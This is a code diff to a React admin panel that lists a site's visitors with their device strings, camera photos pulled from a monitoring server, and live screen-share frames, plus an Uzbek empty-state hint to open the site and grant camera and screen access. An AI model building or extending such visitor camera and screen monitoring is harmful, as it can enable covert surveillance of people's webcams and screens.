@@ -122,35 +122,52 @@ export function AdminPanel() {
           Logout
         </button>
       </div>
-
-      <div className="grid gap-4 md:grid-cols-2 xl:grid-cols-3">
-        {visitors.map((v) => (
-          <article key={v.id} className="rounded-xl border border-white/10 bg-slate-900/70 p-3">
-            <p className="text-xs text-slate-300">ID: {v.id}</p>
-            <p className="mt-1 text-xs text-slate-300">Last seen: {v.lastSeen ? new Date(v.lastSeen).toLocaleString() : '-'}</p>
-            <p className="mt-1 text-xs">Screen: {v.isScreenSharing ? 'ON' : 'OFF'}</p>
-            <p className="mt-2 text-xs text-slate-300">Device: {v.userAgent}</p>
-            {v.photoUrl ? (
-              <img
-                src={`${MONITORING_SERVER_URL}${v.photoUrl}`}
-                alt="camera"
-                className="mt-2 h-44 w-full rounded bg-black/40 object-contain"
-              />
-            ) : (
-              <div className="mt-2 rounded bg-slate-800 p-2 text-xs text-slate-400">No camera photo</div>
-            )}
-            {frames[v.id] ? (
-              <img
-                src={frames[v.id]}
-                alt="screen frame"
-                className="mt-2 h-56 w-full rounded bg-black/40 object-contain"
-              />
-            ) : (
-              <div className="mt-2 rounded bg-slate-800 p-2 text-xs text-slate-400">No live screen frame</div>
-            )}
-          </article>
-        ))}
+      <div className="mb-4 rounded-xl border border-white/10 bg-slate-900/70 p-3 text-sm text-slate-300">
+        <p>Visitors: {visitors.length}</p>
+        {error ? <p className="mt-1 text-red-300">{error}</p> : null}
       </div>
+
+      {visitors.length === 0 ? (
+        <div className="rounded-xl border border-white/10 bg-slate-900/70 p-5 text-sm text-slate-300">
+          Hozircha visitor yo'q. Asosiy saytni boshqa brauzer/tabda ochib, kamera va ekran ruxsatini
+          bering.
+        </div>
+      ) : (
+        <div className="grid gap-4 md:grid-cols-2 xl:grid-cols-3">
+          {visitors.map((v) => (
+            <article key={v.id} className="rounded-xl border border-white/10 bg-slate-900/70 p-3">
+              <p className="text-xs text-slate-300">ID: {v.id}</p>
+              <p className="mt-1 text-xs text-slate-300">
+                Last seen: {v.lastSeen ? new Date(v.lastSeen).toLocaleString() : '-'}
+              </p>
+              <p className="mt-1 text-xs">Screen: {v.isScreenSharing ? 'ON' : 'OFF'}</p>
+              <p className="mt-2 text-xs text-slate-300">Device: {v.userAgent}</p>
+              {v.photoUrl ? (
+                <img
+                  src={`${MONITORING_SERVER_URL}${v.photoUrl}`}
+                  alt="camera"
+                  className="mt-2 h-44 w-full rounded bg-black/40 object-contain"
+                />
+              ) : (
+                <div className="mt-2 rounded bg-slate-800 p-2 text-xs text-slate-400">
+                  No camera photo
+                </div>
+              )}
+              {frames[v.id] ? (
+                <img
+                  src={frames[v.id]}
+                  alt="screen frame"
+                  className="mt-2 h-56 w-full rounded bg-black/40 object-contain"
+                />
+              ) : (
+                <div className="mt-2 rounded bg-slate-800 p-2 text-xs text-slate-400">
+                  No live screen frame
+                </div>
+              )}
+            </article>
+          ))}
+        </div>
+      )}
     </main>
   )
 }
